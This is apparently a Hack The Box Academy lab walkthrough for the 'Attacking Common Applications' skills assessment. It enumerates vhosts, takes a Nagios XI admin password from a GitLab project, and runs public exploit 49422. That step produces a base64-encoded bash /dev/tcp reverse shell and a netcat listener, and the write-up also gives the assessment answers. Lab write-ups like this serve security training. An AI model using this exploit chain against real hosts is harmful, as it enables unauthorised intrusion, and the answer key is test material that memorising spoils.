# Attacking Common Applications - Skills Assessment II

## Objective

During an external penetration test for the company Inlanefreight, you come across a host that, at first glance, does not seem extremely interesting. At this point in the assessment, you have exhausted all options and hit several dead ends. Looking back through your enumeration notes, something catches your eye about this particular host. You also see a note that you don't recall about the gitlab.inlanefreight.local vhost.

Performing deeper and iterative enumeration reveals several serious flaws. Enumerate the target carefully and answer all the questions below to complete the second part of the skills assessment.

### Questions

1. What is the URL of the WordPress instance?
2. What is the name of the public GitLab project?
3. What is the FQDN of the third vhost?
4. What application is running on this third vhost?
5. What is the admin password to access this application?
6. Obtain reverse shell access on the target and submit the contents of the flag.txt file.

## Start 

#### Add VHOST 

```
$ sudo sh -c 'echo "10.129.201.90 inlanefreight.local" >> /etc/hosts'
```

```
$ gobuster vhost -u inlanefreight.local -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -k -q

Found: monitoring.inlanefreight.local (Status: 302) [Size: 27]
Found: blog.inlanefreight.local (Status: 200) [Size: 50119]   
Found: gitlab.inlanefreight.local (Status: 301) [Size: 339]
```

```
$ sudo sh -c 'echo "10.129.201.90 monitoring.inlanefreight.local blog.inlanefreight.local gitlab.inlanefreight.local" >> /etc/hosts'
```

#### Visiting blog.inlanefreight.local

<img width="1896" height="834" alt="image" src="https://github.com/user-attachments/assets/e2da3cb7-ec86-441e-aa58-b157c8ed2ce7" />

<img width="1890" height="643" alt="image" src="https://github.com/user-attachments/assets/3d25a0ce-3247-4193-841e-87bb4e1ef383" />

#### Visiting gitlab.inlanefreight.local

<img width="1752" height="641" alt="image" src="https://github.com/user-attachments/assets/ed4f0dcd-8ee0-4440-bc51-4456973f9d3b" />

<img width="1289" height="608" alt="image" src="https://github.com/user-attachments/assets/e24f8064-8107-4782-9f32-a054fa72ad18" />

<img width="1146" height="552" alt="image" src="https://github.com/user-attachments/assets/831580b9-9ee7-4c9a-8bc5-1fa651157f5d" />

<img width="1801" height="611" alt="image" src="https://github.com/user-attachments/assets/5cf3c7a5-170e-4421-92c8-30635cccb315" />

`GitLab project name` : Virtualhost:

`FQDN of the third vhost` : monitoring.inlanefreight.local

#### Visiting http://monitoring.inlanefreight.local

<img width="1855" height="576" alt="image" src="https://github.com/user-attachments/assets/37915bee-5fcb-49c9-881c-575b997a5418" />

#### Visiting http://gitlab.inlanefreight.local:8180/explore

<img width="1837" height="667" alt="image" src="https://github.com/user-attachments/assets/8f45fdae-e849-402d-a4f1-fa6de8401e7b" />

<img width="1885" height="567" alt="image" src="https://github.com/user-attachments/assets/67eb1e07-eeac-448f-ae8b-55517ee17860" />

<img width="1397" height="498" alt="image" src="https://github.com/user-attachments/assets/9c47c050-a4b8-4c85-ae90-8d94a0bdb2b4" />

`USER` : nagiosadmin 

`PASSWORD` : oilaKglm7M09@CPL&^lC

#### Reverse Shell 

Go to http://monitoring.inlanefreight.local

<img width="1846" height="567" alt="image" src="https://github.com/user-attachments/assets/94e7d852-e2a2-40f5-8639-4fdf68e8252d" />

<img width="1854" height="727" alt="image" src="https://github.com/user-attachments/assets/3f93d5f5-b44d-4bcc-8844-4a337848fac9" />

```
$ searchsploit nagios 5.7
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Nagios XI 5.7.3 - 'Contact Templates' Persist | php/webapps/48893.txt
Nagios XI 5.7.3 - 'Manage Users' Authenticate | php/webapps/48894.txt
Nagios XI 5.7.3 - 'mibs.php' Remote Command I | php/webapps/48959.py  
Nagios XI 5.7.3 - 'SNMP Trap Interface' Authe | php/webapps/48895.txt
Nagios XI 5.7.5 - Multiple Persistent Cross-S | php/webapps/49449.txt
Nagios XI 5.7.X - Remote Code Execution RCE ( | php/webapps/49422.py   <---------------- this one
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```
$ searchsploit -m php/webapps/49422.py
  Exploit: Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated)
      URL: https://www.exploit-db.com/exploits/49422
     Path: /usr/share/exploitdb/exploits/php/webapps/49422.py
    Codes: CVE-2020-35578
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/htb-ac-943240/49422.py   <--------------:) 
```

```
$ nc -nvlp 8888 &
[1] 42117
listening on [any] 8888 ...
```

```
$ python3 49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' 10.10.14.15 8888 &
[2] 43054
┌─[eu-academy-5]─[10.10.14.15]─[htb-ac-943240@htb-eeseohrbjm]─[~]
└──╼ [★]$ [+] Extract login nsp token : f7e1d4f8617e7e135226fcfa56b98ebea9135abc7e1fd31ca9fb614ba80e99c2
[+] Login ... Success!
[+] Request upload form ...
[+] Extract upload nsp token : d9ff2250268273777a9e1d06df1c1dccdec9a1c081a39bbc61bb13114d935e38
[+] Base64 encoded payload : ;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS84ODg4IDA+JjE= | base64 -d | bash;#
[+] Sending payload ...
[+] Check your nc ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.90] 53116
bash: cannot set terminal process group (1115): Inappropriate ioctl for device
bash: no job control in this shell
www-data@skills2:/usr/local/nagiosxi/html/admin$   <--------------shell 
```

`Enter`

```
www-data@skills2:/usr/local/nagiosxi/html/admin$   <----------enter 

[1]+  Stopped                 nc -nvlp 8888
┌─[eu-academy-5]─[10.10.14.15]─[htb-ac-943240@htb-eeseohrbjm]─[~]
└──╼ [★]$ fg 9
bash: fg: 9: no such job
┌─[eu-academy-5]─[10.10.14.15]─[htb-ac-943240@htb-eeseohrbjm]─[~]
└──╼ [★]$ fg     <------------ cmd 
nc -nvlp 8888
whoami
whoami
www-data
www-data@skills2:/usr/local/nagiosxi/html/admin$ ls   <----------- cmd 
ls
activate.php
auditlog.php
autologin.php
components.php
configpermscheck.php
configwizards.php
coreconfigsnapshots.php
dashlets.php
datatransfer.php
deadpool.php
dtinbound.php
dtoutbound.php
f5088a862528cbb16b4e253f1809882c_flag.txt
globalconfig.php
graphtemplates.php
index.php
license.php
mailsettings.php
main.php
mibs.php
missingobjects.php
mobilecarriers.php
monitoringplugins.php
performance.php
sessions.php
sshterm.php
sysstat.php
testemail.php
updates.php
users.php
www-data@skills2:/usr/local/nagiosxi/html/admin$ cat f5088a862528cbb16b4e253f1809882c_flag.txt  <--------- cat cmd 
<dmin$ cat f5088a862528cbb16b4e253f1809882c_flag.txt
afe377683dce373eXXXXXXXXXXXXXX  <----------------------------flag 
www-data@skills2:/usr/local/nagiosxi/html/admin$ 
```

---





















